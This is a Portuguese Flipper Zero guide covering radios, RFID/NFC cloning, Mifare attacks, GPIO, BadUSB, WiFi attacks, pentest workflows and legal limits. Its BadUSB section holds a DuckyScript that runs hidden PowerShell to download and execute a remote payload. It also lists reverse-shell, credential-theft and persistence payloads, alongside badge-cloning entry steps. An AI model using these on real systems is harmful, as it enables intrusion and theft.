---
title: "Flipper Zero: O guia completo para hackers e makers"
draft: false
toc: true
date: 2023-05-26
lastmod: 2026-11-27
description: "Guia do Flipper Zero com rádios, protocolos, firmware, GPIO, BadUSB, fluxos de teste, limites legais e acessórios."
genre: ["Hackeamento de hardware", "Cibersegurança", "Teste de intrusão", "Segurança sem fio", "Equipe vermelha"]
tags: ["Flipper Zero", "hackeamento de hardware", "Sub-GHz", "NFC", "RFID", "infravermelho", "iButton", "BadUSB", "GPIO", "Bluetooth", "firmware Unleashed", "firmware Xtreme", "RogueMaster", "WiFi Dev Board", "teste de intrusão", "equipe vermelha", "segurança sem fio", "clonagem RFID", "Mifare Classic", "EM4100", "HID Prox", "ataque de repetição", "força bruta", "acessórios Flipper Zero", "código aberto", "auditoria de segurança", "segurança física", "engenharia social", "CTF", "firmware Flipper Zero", "apps Flipper Zero", "repetição Sub-GHz", "U2F", "legalidade Flipper Zero", "análise de frequência", "invasão UART", "SPI", "I2C", "JTAG", "SWD", "GPIO Flipper Zero", "WiFi Flipper Zero", "Bluetooth Flipper Zero", "NFC Flipper Zero", "RFID Flipper Zero", "IR Flipper Zero", "guia Flipper Zero 2026"]
cover: "/img/cover/A_colorful_illustration_of_a_Flipper_Zero_device.webp"
coverAlt: "Ilustração colorida de um Flipper Zero cercado por ferramentas e sinais sem fio, simbolizando sua versatilidade e seus recursos"
coverCaption: ""
---

**Flipper Zero** é a ferramenta multifuncional mais reconhecida pela comunidade de segurança prática. Cabe no bolso, custa cerca de US$ 170 e reúne rádio Sub-GHz, leitor RFID de 125 kHz, antena NFC, transceptor infravermelho, porta iButton, rádio Bluetooth, cabeçalho de expansão GPIO e uma porta USB em um dispositivo pequeno o bastante para prender a um chaveiro. Este guia aborda todos os recursos, desde tirar o aparelho da caixa até fluxos avançados de red team.

*Leia cada seção em ordem se você não conhece o Flipper Zero. Se já tem um e quer se aprofundar em um subsistema específico, vá direto à seção relevante.*

## Visão geral do hardware

O **Flipper Zero** usa um microcontrolador STM32WB55. O chip Arm Cortex-M4 / Cortex-M0+ de núcleo duplo integra um rádio Bluetooth 5.0. O aplicativo principal executa no núcleo M4 a até 64 MHz. O núcleo M0+ gerencia a pilha Bluetooth.

| Componente | Detalhes |
|-----------|---------|
| **MCU** | STM32WB55RGV6, Cortex-M4 a 64 MHz + Cortex-M0+ |
| **Flash** | 1 MB interno + SPI NOR externo de 256 Mbit |
| **RAM** | SRAM de 256 KB |
| **Tela** | E-paper de 1,4 polegada (128x64), sempre ligada |
| **Rádio Sub-GHz** | Transceptor CC1101, 300–928 MHz |
| **RFID** | Front-end analógico de 125 kHz (EM4100, HID, Indala e outros) |
| **NFC** | ST25R3916B, 13,56 MHz ISO 14443A/B e 15693 |
| **Infravermelho** | LED transmissor de 940 nm + sensor receptor TSOP75338 |
| **iButton** | Interface 1-Wire, DS1990A e chaves de memória de toque |
| **Bluetooth** | BLE 5.0 (integrado ao STM32WB55) |
| **GPIO** | Cabeçalho de 18 pinos: SPI, I2C, UART, alimentação 5V/3,3V, ADC |
| **USB** | USB-C, suporte a dispositivo HID (BadUSB / U2F) |
| **Bateria** | Li-Po de 2000 mAh, carregamento USB-C, cerca de 30 horas em uso típico |
| **MicroSD** | Até 128 GB, FAT32 ou exFAT |

A **tela e-paper** não consome energia quando exibe uma imagem estática. Por isso, a bateria dura de forma excepcional mesmo com o dispositivo em espera constante.

O **CC1101** é um transceptor Sub-GHz de uso geral da Texas Instruments que cobre as faixas de 300–348 MHz, 387–464 MHz e 779–928 MHz. Sua capacidade de programação torna o módulo Sub-GHz muito flexível.

## Opções de firmware

Você pode executar o **firmware oficial do Flipper Zero** ou um dos vários forks comunitários populares. Cada fork libera recursos que a Flipper Devices limita por motivos regulatórios e legais.

| Firmware | Descrição | Recursos liberados |
|----------|-------------|-------------|
| **Official** | Firmware padrão da Flipper Devices | Padrões conservadores e mais seguros |
| **Unleashed** | Fork mais popular, com foco em estabilidade | Todas as frequências Sub-GHz e protocolos extras |
| **Xtreme** | Rico em recursos e mantido ativamente | Interface personalizada, apps extras e desbloqueios Sub-GHz |
| **RogueMaster** | Repleto de apps de terceiros | Maior pacote de apps logo após a instalação |

Instale qualquer fork gravando-o pelo aplicativo desktop **qFlipper** no Windows, macOS ou Linux, ou copiando um arquivo `.dfu` para o cartão SD e usando o menu de atualização do dispositivo.

*Unleashed é o ponto de partida mais seguro para pesquisa. Xtreme é indicado para quem quer o maior conjunto de recursos. Use o firmware oficial durante viagens para reduzir o escrutínio legal.*

## Rádio Sub-GHz

O módulo Sub-GHz é o recurso que recebe mais atenção. Ele permite gravar, analisar, repetir e transmitir sinais nas faixas usadas por portões de garagem, controles de carro, campainhas, estações meteorológicas sem fio, tomadas e centenas de outros dispositivos.

### Faixas de frequência compatíveis

- **300–348 MHz** — controles antigos e alguns sistemas de portão de garagem dos EUA
- **387–464 MHz** — dispositivos europeus e americanos; 433,92 MHz é a faixa ISM mais comum no mundo
- **779–928 MHz** — 868 MHz (Europa), 915 MHz (ISM dos EUA), 868 MHz LoRa

### Esquemas de modulação comuns

| Modulação | Significado |
|------------|---------------|
| **AM (ASK/OOK)** | Chaveamento por deslocamento de amplitude; sinal simples ligado/desligado, usado pela maioria dos controles simples. |
| **FM (FSK/2-FSK)** | Chaveamento por deslocamento de frequência; usado por estações meteorológicas e alguns controles de carro. |
| **APSK** | Combinação; usada por poucos dispositivos inteligentes. |

O Flipper decodifica sinais OOK brutos automaticamente. Ele os mostra visualmente na tela e permite repeti-los com um toque. Foi isso que tornou o Flipper Zero famoso: a **repetição de códigos estáticos e de códigos rolantes** é trivial em dispositivos que não usam códigos rolantes.

### Código rolante versus código estático

Dispositivos de **código estático** transmitem o mesmo sinal toda vez. O Flipper Zero grava o sinal uma vez e pode repeti-lo quando quiser. Quase todas as tomadas sem fio baratas, campainhas e portões de garagem antigos usam códigos estáticos.

Dispositivos de **código rolante** (KeeLoq, AUT64 e outros) mudam o código a cada uso. Um sinal capturado não pode ser repetido diretamente. Ataques contra esses sistemas são mais complexos e exigem ferramentas especializadas e proximidade de tempo. O Flipper Zero não consegue derrotar códigos rolantes modernos sem modificações.

*Concentre os testes nos dispositivos que você possui. Dispositivos de código estático em sua casa são um excelente alvo de aprendizado.*

### Fluxo de trabalho Sub-GHz

1. Abra **Sub-GHz** no menu principal.
2. Escolha **Read** (opção para ler e capturar o sinal) para capturar um sinal. Aponte o dispositivo para um controle e pressione o botão dele.
3. O Flipper decodifica o sinal e mostra a frequência, a modulação e o padrão bruto de bits.
4. Pressione **Save** (opção para salvar o sinal) para salvá-lo no cartão SD.
5. Pressione **Send** (opção para retransmitir o sinal) ou abra o arquivo salvo depois para retransmiti-lo.

O modo **Frequency Analyzer** (analisador de frequências) permite varrer o espectro passivamente e ver quais frequências estão ativas. Isso ajuda a localizar transmissores desconhecidos.

### Ataques de força bruta

Para protocolos com espaços de chave pequenos, como controles antigos que usam códigos estáticos de 12 ou 24 bits, o Flipper executa uma sequência de **força bruta** que tenta todos os códigos possíveis. Isso funciona contra dispositivos muito antigos ou baratos. É totalmente ineficaz contra códigos rolantes ou espaços de chave longos.

O firmware personalizado inclui dicionários adicionais de força bruta e sequências de ataque específicas de fabricantes. As sequências **Came 12bit**, **Nice 12bit**, **Linear 8bit** e **Holtek 12bit** são comuns.

## RFID (baixa frequência de 125 kHz)

O módulo **RFID de 125 kHz** lê e grava cartões de proximidade de baixa frequência. São cartões e controles usados em sistemas de controle de acesso antigos, microchips de animais e rastreamento industrial.

### Tipos de cartão compatíveis

| Tipo de cartão | Observações |
|-----------|-------|
| **EM4100 / EM4102** | Mais comum, somente leitura de 64 bits. Presente em sistemas de acesso baratos no mundo todo. |
| **HID Prox** | Popular em controle de acesso comercial (HID Global H10301 e variantes). |
| **Indala Prox** | Formato Motorola / Indala usado em sistemas antigos. |
| **IoProx** | Kantech IoProx, também comum em edifícios comerciais da América do Norte. |
| **FDX-B (ISO 11784/11785)** | Padrão de microchip para animais. |
| **Pyramid** | Farpointe Data; semelhante a Indala. |
| **Viking** | Menos comum, usado por alguns sistemas europeus. |

### Leitura de um cartão LF

Mantenha a borda superior do Flipper, onde fica a antena, a poucos centímetros do cartão ou controle. Acesse **125 kHz RFID > Read** (caminho para ler um cartão RFID). A opção Read (ler) lê o cartão LF e mostra seu ID. O dispositivo lê o ID em um ou dois segundos e mostra o código da instalação e o número do cartão.

### Emulação e clonagem

Depois da leitura, você pode salvar o cartão e **emulá-lo** mais tarde: selecione o arquivo salvo e pressione o botão. O Flipper transmite o ID do cartão para que o leitor o reconheça como se fosse o cartão original.

Você também pode **gravar** o ID em um cartão T5577 regravável vazio. Esses cartões custam pouco (cerca de US$ 0,50 cada) e são compatíveis com a maioria dos formatos de baixa frequência.

*Clonar cartões de acesso que você não possui ou não tem autorização para testar é crime na maioria das jurisdições. Sempre obtenha autorização por escrito antes de testar um sistema de controle de acesso.*

### Limitações do RFID LF

O RFID de baixa frequência não oferece proteção criptográfica. Qualquer pessoa com um leitor perto de você pode ler o ID do seu cartão. A segurança física moderna usa cartões inteligentes de alta frequência (NFC de 13,56 MHz) com autenticação mútua.

## NFC (alta frequência de 13,56 MHz)

O **módulo NFC** usa o chip ST25R3916B e é compatível com ISO 14443A, ISO 14443B e ISO 15693. Essa frequência é usada por cartões de pagamento por aproximação, cartões de transporte, cartões inteligentes de acesso a edifícios e etiquetas NFC.

### Padrões compatíveis

| Padrão | Uso comum |
|----------|-----------|
| **ISO 14443A** | Mifare Classic, Mifare DESfire, NXP NTAG e cartões de crédito/débito |
| **ISO 14443B** | Alguns documentos de identidade governamentais e passaportes (camada externa) |
| **ISO 15693** | Etiquetas de bibliotecas e alguns sistemas RFID industriais |
| **EMV (Nível 1)** | Leitura somente de metadados de cartões de pagamento por aproximação |
| **NFC-A/B/F/V** (protocolos de NFC) | Troca geral de dados por NFC |

### Ataques ao Mifare Classic

**Mifare Classic** é um padrão de cartão inteligente de 13,56 MHz que foi quebrado teoricamente em 2008. Muitos sistemas antigos de transporte e controle de acesso a edifícios ainda o utilizam. O Flipper Zero executa vários ataques:

- **Read** (ler) — lê todos os setores cuja chave mantém o padrão de fábrica (`FFFFFFFFFFFF` ou `A0A1A2A3A4A5`).
- **Ataque de dicionário** — testa uma lista de chaves comuns contra setores bloqueados. O firmware personalizado inclui grandes dicionários de chaves.
- **Ataque nested** — exige conhecer a chave de pelo menos um setor. Usa criptoanálise baseada em temporização para obter chaves de outros setores.
- **Ataque Darkside** — funciona sem nenhuma chave conhecida em algumas versões do Mifare Classic. O Flipper precisa ficar a menos de um centímetro do cartão.

Depois de ler todos os setores, salve o despejo completo e **emule** o cartão. O Flipper o emula como se fosse o original, incluindo os dados dos setores.

*Não clone cartões Mifare Classic com saldo ativo, como tarifas de transporte ou créditos de estacionamento, a menos que você seja proprietário do cartão e controle o sistema de retaguarda.*

### Mifare DESfire e cartões modernos

Os cartões **Mifare DESfire EV1/EV2/EV3** usam criptografia AES-128 e autenticação mútua. O Flipper Zero não consegue ler os dados protegidos. Ele pode ler o UID do cartão e a lista de AIDs, mas não acessa dados de aplicativos sem as chaves corretas. Isso é intencional: o DESfire oferece segurança adequada.

**Cartões de pagamento EMV** — Visa, Mastercard e Amex por aproximação — podem revelar metadados disponíveis publicamente, como o número de cartões antigos, a data de validade e o registro de transações. Cartões modernos reduzem os dados retornados pela leitura pública. O Flipper não inicia nem intercepta transações de pagamento reais.

### Etiquetas NFC e NDEF

**NDEF (NFC Data Exchange Format)** é o formato padrão das etiquetas NFC usadas em marketing, autenticação de produtos e etiquetas inteligentes. O Flipper pode ler, salvar, gravar e emular etiquetas NDEF. Isso serve para:

- Clonar etiquetas NXP NTAG203 ou NTAG213 para fins de teste
- Gravar dados NDEF personalizados (URLs, cartões de contato e credenciais de Wi-Fi)
- Emular uma etiqueta para acionar uma ação no celular sem a etiqueta física

## Infravermelho (IR)

O módulo infravermelho combina um LED de 940 nm para transmissão e um demodulador TSOP75338 para recepção. Ele é compatível com praticamente todos os protocolos de controles remotos IR de consumo.

### Protocolos decodificados compatíveis

| Protocolo | Dispositivos comuns |
|----------|---------------|
| **NEC** | O mais comum; usado por LG, Samsung, Panasonic e muitos outros |
| **RC5** | Dispositivos Philips |
| **RC6** | Dispositivos Philips e Microsoft e receptores de TV a cabo |
| **Samsung32** | TVs e sistemas de home theater Samsung |
| **NECext** | NEC estendido, com endereços de 32 bits |
| **SIRC12 / SIRC15 / SIRC20** | Dispositivos Sony |
| **Kaseikyo** | Panasonic e JVC |
| **RCA** | Controles remotos da marca RCA |

O Flipper também captura e reproduz **sinais IR brutos** de protocolos que não consegue decodificar. A captura bruta armazena a temporização exata dos pulsos e intervalos e os reproduz com fidelidade total.

### Controle remoto universal

O aplicativo integrado **Universal Remotes** permite navegar por um banco de códigos IR organizado por marca e categoria de dispositivo. Você pode desligar TVs, ajustar o volume de soundbars e controlar aparelhos de ar-condicionado sem um controle físico. A biblioteca IR comunitária no GitHub (`flipperzero-ir-relay`) contém milhares de códigos adicionais.

*Em uma operação de red team ou de engenharia social, o controle remoto universal IR pode causar distrações em ambientes com telas visíveis.*

### Captura do seu próprio controle remoto

1. Acesse **Infrared > Learn New Remote** (infravermelho > aprender um novo controle remoto).
2. Aponte o controle original para a janela do receptor IR do Flipper, na borda superior.
3. Pressione cada botão que deseja capturar. O Flipper salva cada botão separadamente.
4. Dê um nome ao arquivo do controle remoto e salve-o.
5. Reproduza qualquer botão pelo arquivo salvo.

## iButton e 1-Wire

**iButton** (Dallas/Maxim 1-Wire) é um protocolo por contato usado em alguns sistemas de acesso físico, rastreamento de ativos e sensores de temperatura. O contato iButton é o pequeno disco ou cilindro metálico encostado no leitor.

### Tipos de chave compatíveis

| Tipo de chave | Observações |
|----------|-------|
| **DS1990A** | Chave de acesso mais comum; ID único de 64 bits, somente leitura |
| **DS1992** | Chave de memória com NVRAM de 1 KB |
| **DS1996** | Chave de memória com NVRAM de 64 KB |
| **Cyfral** | Formato de sistemas de acesso do Leste Europeu |
| **Metacom** | Formato de intercomunicação menos comum |

Para ler uma chave, encoste a porta iButton do Flipper, os contatos dourados na borda inferior, na chave. Salve e emule-a pelo mesmo fluxo usado com RFID e NFC. O Flipper também grava IDs em chaves iButton RW1990 regraváveis vazias.


## GPIO e hacking de hardware

O **cabeçalho GPIO de 18 pinos**, na parte superior do Flipper Zero, é a principal interface para hacking de hardware. Ele expõe SPI, I2C, UART, ADC e linhas de alimentação.

### Pinagem GPIO

| Pino | Função |
|-----|---------|
| **1** | 5V (entrada, somente via USB quando conectado) |
| **2, 4** | GND |
| **3** | Saída de 3,3V (máx. 20 mA) |
| **5** | PA4 / SPI1_MISO / ADC |
| **6** | PA6 / SPI1_SCK |
| **7** | PA7 / SPI1_MOSI |
| **8** | PA3 / UART TX |
| **9** | PB3 / UART RX |
| **10** | PC3 / ADC |
| **11** | PC1 / ADC |
| **12** | PA0 / ADC |
| **13** | PB2 / GPIO |
| **14** | PE3 / SPI1_CS |
| **15** | PB4 / I2C1_SDA |
| **16** | PB13 / I2C1_SCL |
| **17** | PB14 / GPIO / USART1 TX (depuração) |
| **18** | PA8 / GPIO |

*Todos os pinos GPIO operam com lógica de 3,3V. Não aplique 5V aos pinos de dados. Use um conversor de nível para dispositivos de 5V.*

### Acesso ao console UART

Muitos dispositivos embarcados deixam um console de depuração UART ativo mesmo depois da produção. Ao conectar os pinos UART do Flipper aos pinos UART TX/RX do dispositivo-alvo, você acessa um console serial e talvez consiga:

- Abrir um shell privilegiado
- Observar no log de inicialização credenciais e informações do sistema
- Gravar firmware sem assinatura se o menu do bootloader estiver acessível

Acesse **GPIO > USB-UART Bridge** (menu GPIO para abrir uma ponte USB para UART) ou abra uma conexão de terminal pelo aplicativo GPIO. O Flipper aparece como uma porta serial USB no computador conectado e faz a ponte com os pinos UART.

### Sensores SPI e I2C

Conecte qualquer sensor SPI ou I2C, como acelerômetro, sensor de pressão barométrica, sensor de temperatura e umidade ou tela OLED, diretamente ao cabeçalho GPIO. Há aplicativos comunitários para muitos chips comuns:

- **SSD1306** — driver de tela OLED
- **BME280** — temperatura, umidade e pressão
- **NRF24L01** — módulo de rádio de 2,4 GHz que amplia a superfície de ataque sem fio
- **CC1101** — antena externa para ampliar o alcance Sub-GHz

### Depuração JTAG e SWD

O cabeçalho GPIO do Flipper expõe sinais SWD em alguns pinos. Com um adaptador, você pode usar o Flipper como **sonda de depuração JTAG/SWD** para:

- Parar e avançar passo a passo pelo código de um microcontrolador-alvo
- Ler e gravar a memória flash
- Extrair firmware de dispositivos bloqueados com glitch de tensão seguido de acesso de depuração

Este é um uso avançado. A adaptação do firmware **BlackMagic Probe** para o Flipper torna esse fluxo viável.

{{< figure src="flipper-zero-gpio-uart-jtag-swd-hardware-attack-surface-diagram.webp" alt="Diagrama do cabeçalho GPIO do Flipper Zero mostrando conexões UART, SPI, I2C, JTAG e SWD com dispositivos embarcados" >}}

## BadUSB e ataques USB HID

Quando conectado a um computador por USB-C, o Flipper Zero é identificado como um **teclado USB HID**. Esse é o vetor BadUSB: o dispositivo digita teclas automaticamente, sem instalar drivers.

### DuckyScript

Os scripts BadUSB do Flipper usam **DuckyScript**, a mesma linguagem de script do USB Rubber Ducky, da Hak5. O script é um arquivo de texto simples colocado em `badusb/` no cartão SD.

```
REM Abrir a caixa Executar e iniciar o PowerShell
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -W Hidden -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
ENTER
```

Cargas BadUSB comuns:

- **Shell reverso** — abre uma conexão de rede de volta para a máquina de um invasor
- **Extração de credenciais** — executa Mimikatz ou ferramentas semelhantes na memória
- **Persistência** — adiciona uma entrada de inicialização ou uma tarefa agendada
- **Extração de senhas de Wi-Fi** — usa `netsh` para exportar perfis sem fio salvos
- **Injeção de chave SSH** — adiciona uma chave de invasor a `authorized_keys`

### Defesas contra BadUSB

O ataque BadUSB funciona porque os computadores confiam em teclados sem restrições. Entre as defesas estão:

- **USBGuard** (Linux) — permite apenas dispositivos USB específicos, identificados pelo ID do fabricante e do produto
- **Política de bloqueio USB** (Windows) — desativa dispositivos HID de fabricantes que não estejam na lista de permissão
- **Bloqueadores físicos de portas** — impedem a inserção de dispositivos USB em ambientes de alta segurança
- **Detecção de endpoint** — soluções como CrowdStrike detectam heurísticamente a injeção rápida de teclas

### Chave de hardware U2F

O Flipper Zero também funciona como uma **chave de segurança de hardware FIDO U2F**. O firmware oficial inclui suporte a U2F. Registre o Flipper em qualquer site compatível com FIDO U2F, como GitHub, Google ou Cloudflare, e toque no botão traseiro do aparelho para confirmar a autenticação.

Assim, o Flipper também serve como token de hardware para suas próprias contas. Ele armazena o material da chave privada no armazenamento seguro do microcontrolador.

## Bluetooth

O STM32WB55 inclui Bluetooth 5.0. O Flipper usa BLE para:

- **Flipper Mobile App** — aplicativo para iOS e Android que gerencia arquivos, atualiza o firmware e controla o aparelho remotamente
- **BadBT** (aplicativo comunitário) — envia teclas DuckyScript por Bluetooth em vez de USB, permitindo injeção HID sem fio em computadores pareados
- **Scanner BLE** — busca passivamente anúncios BLE próximos, útil para identificar dispositivos IoT em um edifício

O alcance do Bluetooth é modesto, cerca de 10–30 metros em espaço aberto. Isso basta para transmitir um BadUSB sem fio de uma bolsa ou bolso quando você está perto de uma estação de trabalho-alvo.

### Pareamento do aplicativo móvel

1. Baixe o **Flipper Mobile App** na App Store ou no Google Play.
2. No Flipper, acesse **Settings > Bluetooth > Pair Phone** (menu para emparelhar o telefone por Bluetooth).
3. Abra o aplicativo e siga a solicitação de pareamento.
4. Use o aplicativo para navegar pelo cartão SD, instalar apps do catálogo e transmitir dados dos sensores.

## Firmware personalizado em detalhes

### Firmware Unleashed

O **Unleashed** (disponível em `github.com/DarkFlippers/unleashed-firmware`) é o fork comunitário mais conservador. Ele remove restrições geográficas de frequências Sub-GHz e amplia o suporte a protocolos, mantendo-se próximo da base de código oficial. A prioridade é a estabilidade.

Principais adições em relação ao firmware oficial:

- Faixa de frequências Sub-GHz ampliada (300–928 MHz sem restrições)
- Protocolos Sub-GHz adicionais (CAME, Nice, DoorHan e outros)
- Protocolos NFC adicionais
- Suporte ampliado a DuckyScript no BadUSB
- Banco de códigos IR maior

### Firmware Xtreme

O **Xtreme** (disponível em `github.com/Flipper-XFW/Xtreme-Firmware`) acrescenta um sistema completo de recursos visuais personalizados às funções do Unleashed. Você pode mudar o nome do Flipper, a tela inicial, as animações da área de trabalho e o comportamento do LED. O menu Settings também recebe muito mais opções.

Recursos adicionais:

- App Hub com aplicativos de terceiros selecionados
- Cargas de ataque Sub-GHz e NFC ampliadas
- Scripts para LED RGB
- Melhorias no gerenciamento de arquivos

### RogueMaster

O **RogueMaster** reúne a maior coleção de aplicativos de terceiros e ferramentas comunitárias, incluindo muitos recursos experimentais ou arriscados em determinadas situações. É menos estável que Unleashed ou Xtreme, mas oferece o maior conjunto de ferramentas em uma instalação.

### Gravação de qualquer firmware

```bash
# Usando o CLI do qFlipper
qFlipper cli -c firmware /path/to/firmware.dfu

# Ou coloque firmware.zip na raiz do cartão SD e acesse:
# Settings > Firmware Update > Update from SD Card (Configurações > Atualização do firmware > Atualizar do cartão SD)
```

*Sempre faça backup do conteúdo do cartão SD antes de atualizar o firmware. O processo de atualização não apaga o cartão, mas o backup continua sendo uma boa prática.*

## Ecossistema de aplicativos do Flipper

### Catálogo oficial de aplicativos

O catálogo oficial em **lab.flipper.net** lista aplicativos que você instala diretamente pelo app móvel. As categorias incluem:

- Ferramentas Sub-GHz
- Utilitários NFC
- Jogos
- Sensores GPIO
- Ferramentas para desenvolvedores
- Música e entretenimento

### Fontes comunitárias de aplicativos

- **flipc.org** — banco comunitário de sinais Sub-GHz capturados, despejos NFC e bancos de dados IR organizados por dispositivo
- **awesome-flipperzero** (GitHub) — lista selecionada de aplicativos, ferramentas, scripts e complementos de hardware
- **Repositório UberGuidoZ Flipper** (GitHub) — grande coleção de capturas Sub-GHz organizadas por protocolo e fabricante

### Aplicativos de terceiros em destaque

| Aplicativo | Finalidade |
|-----|---------|
| **Seader** | Lê dados PACS de cartões inteligentes usando um módulo compatível com Wiegand |
| **POCSAG Pager** | Decodifica mensagens de pager POCSAG em 152–160 MHz |
| **iButton Fuzzer** | Testa por força bruta espaços de chaves iButton |
| **NFC Playlist** | Percorre automaticamente uma lista de cartões NFC |
| **T5577 Writer** | Grava dados EM4100/HID em cartões T5577 vazios |
| **BLE Spam** | Inunda dispositivos próximos com pacotes de anúncio BLE |
| **ESP32 WiFi Marauder** | Controla o WiFi Marauder em uma placa de desenvolvimento ESP32 WiFi |
| **Metroflip** | Analisa e exibe dados de cartões de transporte |
| **USB Mouse Jiggler** | Mantém a tela ativa simulando movimentos do mouse HID |

## Acessórios e expansões de hardware

### WiFi Dev Board

A **WiFi Dev Board** conecta-se diretamente ao cabeçalho GPIO do Flipper. Ela contém um ESP32-S2 com o firmware **WiFi Marauder** e acrescenta recursos completos de 802.11 b/g/n:

- **Varredura de SSIDs** — identifica todos os pontos de acesso próximos
- **Flood de beacons** — transmite dezenas de SSIDs falsos para confundir clientes e gerar ruído visível
- **Ataque de desautenticação** — envia quadros 802.11 de desautenticação para desconectar clientes de um ponto de acesso
- **Captura de probes** — captura solicitações de sondagem para identificar dispositivos e os SSIDs de que eles se lembram
- **Ataque WPS** — procura roteadores com WPS habilitado e tenta enumerar PINs (processo lento)
- **Captura de PMKID** — captura hashes PMKID para quebra offline sem um cliente

A tela e os botões do Flipper controlam a WiFi Dev Board. Não é necessário usar telefone ou computador.

*Enviar quadros de desautenticação contra redes que não são suas é ilegal nos Estados Unidos segundo a Computer Fraud and Abuse Act (CFAA) e leis equivalentes na maioria dos países. Use esse recurso somente em um laboratório autorizado.*

### Módulo de videogame

O **Video Game Module** inclui um RP2040 e uma pequena bateria recarregável. Ele se conecta ao cabeçalho GPIO e acrescenta jogos multijogador sem fio. Também funciona como microcontrolador independente para executar código personalizado e descarregar tarefas de processamento do STM32 principal.

### Módulo ESP32 WROOM (faça você mesmo)

Um **ESP32-WROOM-32** padrão conectado ao GPIO do Flipper por UART ou SPI amplia ainda mais a superfície de ataque:

- Wi-Fi 802.11 completo com firmware personalizado
- Bluetooth Classic de 2,4 GHz e BLE ao mesmo tempo que o BLE próprio do Flipper
- Expansão externa de GPIO
- Interface de servidor web para controle remoto durante operações presenciais

### Adaptador de cabeçalho Raspberry Pi Zero 2W

Adaptadores projetados pela comunidade conectam um **Raspberry Pi Zero 2W** ao cabeçalho GPIO do Flipper. O Pi executa um ambiente Linux completo e se comunica com o Flipper por UART ou serial USB. Isso serve para:

- Registrar dados por períodos longos
- Executar Bettercap ou Kismet para reconhecimento de rede
- Atuar como retransmissor C2 em operações de red team
- Armazenar capturas grandes demais para um cartão microSD

{{< figure src="flipper-zero-wifi-devboard-esp32-raspberry-pi-gpio-accessories-overview.webp" alt="Visão geral dos acessórios de hardware do Flipper Zero, incluindo a WiFi Dev Board, o módulo ESP32 e o adaptador de cabeçalho GPIO do Raspberry Pi Zero" >}}

## Fluxos de teste de intrusão

### Fluxo de contorno de acesso físico

1. Use o **leitor RFID de 125 kHz** para ler crachás de funcionários durante uma aproximação casual no saguão.
2. Clone o crachá em um cartão T5577 vazio ou emule-o diretamente pelo Flipper.
3. Use o crachá clonado para entrar em áreas protegidas.
4. Registre quais leitores aceitaram a credencial clonada e informe o cliente.

Esse teste verifica se o local depende de EM4100 (inseguro e clonável) ou de cartões inteligentes NFC modernos (mais difíceis de clonar).

### Inventário de dispositivos sem fio

1. Percorra o local-alvo com o **Sub-GHz Frequency Analyzer** (analisador de frequências sub-GHz) em execução.
2. Anote todas as frequências e os tipos de sinal ativos.
3. Use o modo **Read** (opção para ler e capturar o sinal) para capturar e identificar sinais de dispositivos como sensores de alarme sem fio, barreiras de estacionamento e controladores de HVAC.
4. Relate todos os dispositivos de código fixo como descobertas de alta gravidade.

### Levantamento RFID

1. Use o modo **NFC > Detect Reader** para fazer o Flipper se comportar como um cartão e detectar leitores próximos sem carregar credenciais.
2. Identifique os tipos de leitor (compatível com Mifare Classic, DESfire ou ISO 15693) para avaliar o nível de segurança de cada ponto de acesso.

### Simulação de ataque BadUSB por abandono

1. Pré-carregue uma carga DuckyScript no cartão SD do Flipper.
2. Deixe o Flipper conectado a uma estação de trabalho desbloqueada. Isso exige acesso físico.
3. O script é executado automaticamente: enumera o computador, exfiltra credenciais e estabelece uma conexão de retorno.
4. Registre o tempo até a execução e as taxas de detecção.

Esse teste avalia as políticas de controle de dispositivos USB da organização e a cobertura de detecção de endpoints.

### Teste de sensores de alarme sem fio

Muitos sensores sem fio de portas e janelas transmitem sinais OOK simples em Sub-GHz. Se usarem códigos fixos:

1. **Grave** o sinal do sensor, acionado pela abertura de uma janela em um ambiente de teste autorizado.
2. **Reproduza** o sinal para simular o acionamento do sensor sem abrir fisicamente a janela.
3. Verifique se o sistema de alarme gera um alerta.

Isso demonstra se um invasor poderia neutralizar sensores perimetrais sem fio usando um dispositivo de US$ 170.

{{< figure src="flipper-zero-penetration-testing-physical-access-rfid-badusb-workflow-diagram.webp" alt="Fluxograma dos testes de intrusão com Flipper Zero, cobrindo contorno de acesso físico, inventário de dispositivos sem fio, levantamento RFID e simulação de ataque BadUSB por abandono" >}}

## Usos em CTF e competições

O Flipper Zero aparece em competições **Capture The Flag** nas categorias de segurança física. Desafios comuns incluem:

- Clonar um crachá para abrir uma caixa trancada que contém uma flag
- Reproduzir um sinal Sub-GHz para destrancar uma porta simulada
- Decodificar um sinal IR para recuperar uma mensagem oculta
- Emular uma etiqueta NFC para autenticar como outro usuário
- Usar BadUSB para executar uma carga em uma máquina com um usuário presente

O registro integrado do Flipper e a grande capacidade do cartão SD facilitam o arquivamento de cada sinal coletado durante um CTF para análise posterior.

## Usos defensivos

Equipes de segurança usam o Flipper Zero para auditar os próprios ambientes:

- **Auditoria de cartões** — leia todos os cartões de acesso para identificar sistemas EM4100 ou Mifare Classic inseguros que devem ser atualizados para DESfire EV2 ou superior.
- **Auditoria de dispositivos sem fio** — identifique todos os dispositivos Sub-GHz e sinalize sistemas de código fixo.
- **Teste de políticas BadUSB** — verifique se as políticas de bloqueio de dispositivos USB HID funcionam corretamente.
- **Auditoria de controles IR** — confirme que equipamentos sensíveis não podem ser controlados por um controle remoto universal IR.
- **Teste de clonagem de etiquetas NFC** — determine se etiquetas NFC em produtos ou credenciais podem ser clonadas.

## Considerações legais e éticas

O Flipper Zero é uma ferramenta legítima de pesquisa de segurança. Também pode ser usado indevidamente. Sua exposição legal depende da jurisdição e do contexto.

### O que costuma ser legal com autorização

- Testar dispositivos que você possui
- Realizar testes de intrusão autorizados sob um contrato de trabalho assinado
- Fazer pesquisa de segurança em um laboratório controlado
- Ler seus próprios cartões de acesso e controles remotos
- Participar de competições CTF autorizadas

### O que costuma ser ilegal

- Reproduzir o sinal de um controle de garagem que não é seu para entrar
- Clonar um cartão de acesso que permita entrar em um edifício sem autorização
- Enviar quadros de desautenticação contra uma rede que você não controla
- Usar BadUSB em um computador sem autorização por escrito
- Interceptar comunicações privadas, em Sub-GHz ou em outras faixas, na maioria das jurisdições

Nos **Estados Unidos**, as leis relevantes incluem a Computer Fraud and Abuse Act (CFAA), a Electronic Communications Privacy Act (ECPA) e as regras da Federal Communications Commission (FCC) sobre transmissão por radiofrequência. Na **União Europeia**, há proteções semelhantes nas leis nacionais contra crimes informáticos e na Diretiva de Equipamentos de Rádio.

